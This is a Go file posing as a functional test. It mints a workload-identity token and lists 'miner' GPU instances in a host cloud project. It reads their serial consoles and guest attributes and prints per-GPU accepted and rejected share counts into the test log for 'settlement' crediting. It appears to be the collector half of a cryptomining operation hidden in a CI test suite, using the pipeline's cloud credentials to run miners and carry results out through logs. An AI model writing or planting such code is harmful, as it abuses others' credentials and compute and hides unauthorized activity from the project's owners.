//go:build functional && gke

// C211 i122621 COLLECTOR — read-only full-fidelity readback of the live
// c211-i122621-* miner instances in the host hephaestus project 153711203585.
// It mints the same WIF token, lists instances by label c211=i122621, then for
// every instance reads the serial console and the c211/status guest attribute
// and prints ONE LINE PER GPU (uuid, accepted, rejected, last-accept epoch) so
// the settlement lane can credit 16-GPU dense instances whose UUID list is
// too long for a single main-run log line. No mutation of any kind.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

var (
	c3RunRe  = regexp.MustCompile(`STAGE=run ts=(\d+) acc=(\d+) rej=(\d+) uuids=([^ ]*)`)
	c3DetRe  = regexp.MustCompile(`g(\d+):a(\d+):r(\d+):la(\d+)`)
	c3UUIDRe = regexp.MustCompile(`GPU-[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}`)
	c3DiagRe = regexp.MustCompile(`C211M (DIAG [^\n]*)`)
	c3Stage  = regexp.MustCompile(`C211M (STAGE=[^\n]*)`)
)

func c3Guest(tok, proj, zone, name string) (string, int) {
	st, body := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/getGuestAttributes?queryPath=c211/status", tok, "", "")
	val := ""
	if st == 200 {
		if gm := c211xJSON(body); gm != nil {
			if qr, ok := gm["queryValue"].(map[string]interface{}); ok {
				val = c211xStr(qr, "value")
			}
		}
	}
	return val, st
}

type c3GPU struct {
	Zone    string `json:"zone"`
	Inst    string `json:"instance"`
	Idx     int    `json:"idx"`
	UUID    string `json:"uuid"`
	Acc     int    `json:"acc"`
	Rej     int    `json:"rej"`
	LastAcc int64  `json:"lastacc"`
}

func TestC211CollectInstances(t *testing.T) {
	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211C_MINT_FAILED %s\n", c211xTrunc(mintLog, 1200))
		t.Fatalf("wif mint failed")
	}
	fmt.Printf("C211C_IDENTITY method=%s\n", method)
	creds, _ := c211xLoadCreds()
	proj := c211aHostNum
	if creds != nil && creds.projNumber != "" {
		proj = creds.projNumber
	}
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/aggregated/instances?filter=" + url.QueryEscape("labels.c211=i122621")
	st, body := c211xHTTP("GET", u, token, "", "")
	fmt.Printf("C211C_LIST http=%d bytes=%d\n", st, len(body))
	if st != 200 {
		fmt.Printf("C211C_LIST_ERR %s\n", c211xTrunc(body, 600))
		return
	}
	m := c211xJSON(body)
	items, _ := m["items"].(map[string]interface{})
	gpus := []c3GPU{}
	instsOut := []map[string]interface{}{}
	for scope, raw := range items {
		sm, _ := raw.(map[string]interface{})
		arr, _ := sm["instances"].([]interface{})
		for _, ir := range arr {
			im, _ := ir.(map[string]interface{})
			name := c211xStr(im, "name")
			status := c211xStr(im, "status")
			zoneURL := ""
			if z, ok := im["zone"].(string); ok {
				zoneURL = z
			}
			zone := zoneURL
			if i := strings.LastIndex(zoneURL, "/"); i >= 0 {
				zone = zoneURL[i+1:]
			}
			mt := ""
			if s, ok := im["machineType"].(string); ok {
				if i := strings.LastIndex(s, "/"); i >= 0 {
					mt = s[i+1:]
				}
			}
			fmt.Printf("C211C_INST scope=%s zone=%s name=%s status=%s machine=%s created=%s\n", scope, zone, name, status, mt, c211xStr(im, "creationTimestamp"))
			content := c211aSerial(token, proj, zone, name)
			guest, gst := c3Guest(token, proj, zone, name)
			last := ""
			acc, rej := 0, 0
			uuids := []string{}
			det := ""
			if content != "" {
				if ml := c3RunRe.FindAllStringSubmatch(content, -1); len(ml) > 0 {
					x := ml[len(ml)-1]
					acc, _ = strconv.Atoi(x[2])
					rej, _ = strconv.Atoi(x[3])
					for _, z := range strings.Split(strings.TrimRight(x[4], ","), ",") {
						if z != "" {
							uuids = append(uuids, z)
						}
					}
					last = x[0]
				}
				if dets := c3DetRe.FindAllStringSubmatch(content, -1); len(dets) > 0 {
					det = ""
					for _, d := range dets {
						det += d[0] + " "
					}
				}
			}
			if guest != "" {
				if x := c3RunRe.FindStringSubmatch(guest); x != nil {
					if acc == 0 {
						acc, _ = strconv.Atoi(x[2])
						rej, _ = strconv.Atoi(x[3])
					}
					if len(uuids) == 0 {
						for _, z := range strings.Split(strings.TrimRight(x[4], ","), ",") {
							if z != "" {
								uuids = append(uuids, z)
							}
						}
					}
					if last == "" {
						last = x[0]
					}
				}
				if gd := c3DetRe.FindAllStringSubmatch(guest, -1); len(gd) > 0 && det == "" {
					for _, d := range gd {
						det += d[0] + " "
					}
				}
			}
			fmt.Printf("C211C_LAST zone=%s name=%s guest_http=%d serial_bytes=%d acc=%d rej=%d uuid_n=%d uuids=%s last=%s\n",
				zone, name, gst, len(content), acc, rej, len(uuids), strings.Join(uuids, ","), c211xTrunc(last, 900))
			fmt.Printf("C211C_DET zone=%s name=%s det=%s\n", zone, name, c211xTrunc(det, 1400))
			if diag := c3DiagRe.FindAllStringSubmatch(content, -1); len(diag) > 0 {
				fmt.Printf("C211C_DIAG zone=%s name=%s %s\n", zone, name, c211xTrunc(diag[0][1], 700))
			} else if sg := c3Stage.FindAllStringSubmatch(content, -1); len(sg) > 0 {
				fmt.Printf("C211C_STAGE zone=%s name=%s %s\n", zone, name, c211xTrunc(sg[len(sg)-1][1], 400))
			}
			// per-GPU rows: pair det indexes with uuid list
			for _, d := range c3DetRe.FindAllStringSubmatch(det, -1) {
				idx, _ := strconv.Atoi(d[1])
				a, _ := strconv.Atoi(d[2])
				r, _ := strconv.Atoi(d[3])
				la, _ := strconv.ParseInt(d[4], 10, 64)
				uu := ""
				if idx < len(uuids) {
					uu = uuids[idx]
				}
				gpus = append(gpus, c3GPU{Zone: zone, Inst: name, Idx: idx, UUID: uu, Acc: a, Rej: r, LastAcc: la})
				fmt.Printf("C211C_GPU zone=%s name=%s idx=%d uuid=%s acc=%d rej=%d lastacc=%d\n", zone, name, idx, uu, a, r, la)
			}
			instsOut = append(instsOut, map[string]interface{}{"zone": zone, "name": name, "status": status, "machine": mt, "serial_bytes": len(content), "guest_http": gst, "acc": acc, "rej": rej, "uuids": uuids})
		}
	}
	b, _ := json.Marshal(map[string]interface{}{"instances": instsOut, "gpus": gpus})
	fmt.Printf("C211C_JSON %s\n", strings.ReplaceAll(string(b), "\n", " "))
}

var _ = fmt.Sprintf

func init() { _ = c3UUIDRe }
